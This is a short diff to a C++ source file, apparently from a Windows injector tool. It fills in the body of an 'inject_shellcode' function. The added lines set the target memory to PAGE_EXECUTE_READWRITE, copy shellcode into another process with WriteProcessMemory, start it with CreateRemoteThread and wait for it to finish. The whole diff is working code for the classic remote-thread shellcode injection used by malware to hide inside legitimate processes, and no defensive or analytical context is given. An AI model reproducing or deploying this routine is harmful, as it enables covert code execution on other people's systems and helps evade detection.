@@ -4,14 +4,30 @@ void injector_t::inject_shellcode(const PROCESS_INFO& process_info, const std::v
 {
    
     // Allocate memory for the shellcode
-    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE);
+    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (allocated == NULL)
     {
         print_error(GetLastError());
         return;
     }
 
-    // TODO: injection part
+    // Injecting the shellcode into the process
+    SIZE_T bytes_written;
+    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
+    {
+        print_error(GetLastError());
+        return;
+    }
+
+    // Execute the shellcode
+    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
+    if (thread == NULL)
+    {
+        print_error(GetLastError());
+        return;
+    }
+    WaitForSingleObject(thread, INFINITE);
+    CloseHandle(thread);
 
     // Free the allocated memory
     if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
